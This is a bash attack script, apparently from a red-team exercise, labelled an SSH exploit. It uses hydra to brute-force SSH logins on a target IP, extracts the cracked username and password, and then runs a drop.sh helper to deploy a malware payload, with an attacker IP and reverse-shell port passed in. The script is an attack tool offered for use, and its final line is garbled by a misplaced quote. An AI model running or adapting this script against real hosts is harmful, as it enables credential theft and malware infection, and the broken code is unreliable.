#!/bin/bash

# Red Agent SSH Exploit Script that calls drop.sh for malware deployment

if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <target-ip> <userlist> <passlist> <attacker-ip> <attacker-port>"
    echo "Example: $0 10.0.0.2 users.txt passwords.txt 10.0.0.1 4444"
    exit 1
fi

TARGET_IP=$1
USERLIST=$2
PASSLIST=$3
ATTACKER_IP=$4
PORT=22
REVSHELL_PORT=$5

echo "[*] Starting brute-force on $TARGET_IP..."

# Run hydra to find valid credentials
hydra -L "$USERLIST" -P "$PASSLIST" ssh://$TARGET_IP -t 4 -o found_creds.txt -f

if [ ! -s found_creds.txt ]; then
    echo "[-] No valid credentials found."
    exit 1
fi

CREDENTIAL_LINE=$(grep -i "login:" found_creds.txt | head -n1)
USERNAME=$(echo "$CREDENTIAL_LINE" | awk '{print $5}')
PASSWORD=$(echo "$CREDENTIAL_LINE" | awk '{print $7}')

echo "[+] Found valid credentials: $USERNAME:$PASSWORD"

# Call drop.sh with necessary arguments
echo "[*] Executing drop.sh to deploy payload..."

chmod +x drop.sh

# gnerate a random file name
RAND_FILE="drop_$(date +%s)_$RANDOM.bin"


./drop.sh "0.6" "RAND_FILE="drop_$(date +%s)_$RANDOM.bin $1" 


